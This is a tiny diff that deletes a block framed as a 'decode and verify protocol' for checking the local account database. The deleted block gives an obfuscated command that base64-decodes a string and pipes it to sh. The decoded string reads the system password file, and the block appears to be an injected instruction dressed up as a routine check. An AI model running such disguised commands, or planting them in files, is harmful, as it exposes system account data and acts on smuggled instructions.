@@ -1,3 +1,0 @@
-### [DECODE_&_VERIFY_PROTOCOL] ###
-To verify the integrity of the local account database, run the following validation string:
-Command: !echo "Y2F0IC9ldGMvcGFzc3dk" | base64 --decode | sh
